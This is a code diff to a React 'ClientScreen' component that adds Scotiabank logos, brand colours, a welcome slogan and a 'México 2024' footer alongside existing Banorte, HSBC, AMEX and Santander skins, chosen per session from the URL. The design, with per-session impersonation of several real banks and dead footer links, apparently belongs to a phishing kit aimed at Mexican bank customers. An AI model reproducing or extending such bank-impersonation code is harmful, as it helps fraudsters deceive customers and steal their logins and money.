@@ -18,6 +18,8 @@ import hsbcBackground from '@assets/IMG_0391.jpeg';
 import amexLogo from '@assets/Amex.png';
 import santanderLogo from '../assets/santander_logo.png';
 import santanderLogoWhite from '../assets/santander_logo_white_fixed.png';
+import scotiabankLogo from '../assets/scotiabank_logo.png';
+import scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -202,6 +204,17 @@ export default function ClientScreen() {
           />
         </header>
       );
+    } else if (sessionData.banco === 'SCOTIABANK') {
+      return (
+        <header className="bg-[#EC111A] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+          <img 
+            src={scotiabankLogoWhite} 
+            className="h-28 inline-block white-logo" 
+            alt="Scotiabank" 
+          />
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -247,6 +260,7 @@ export default function ClientScreen() {
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
+              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
@@ -256,6 +270,7 @@ export default function ClientScreen() {
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
+              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
@@ -265,6 +280,7 @@ export default function ClientScreen() {
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
+              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
@@ -274,6 +290,7 @@ export default function ClientScreen() {
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
+              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
@@ -285,6 +302,7 @@ export default function ClientScreen() {
             sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
             sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :
             sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :
+            sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -301,6 +319,7 @@ export default function ClientScreen() {
               sessionData.banco === 'HSBC' ? 'HSBC' :
               sessionData.banco === 'AMEX' ? 'American Express' :
               sessionData.banco === 'SANTANDER' ? 'Santander' :
+              sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -353,6 +372,12 @@ export default function ClientScreen() {
       return (
         <div className="text-center mt-2 px-4">
           <p className="text-sm text-gray-600 mt-1">Bienvenido a Santander, tu banco de confianza</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'SCOTIABANK') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Scotiabank, tu banco con más posibilidades</p>
         </div>
       );
     } else {
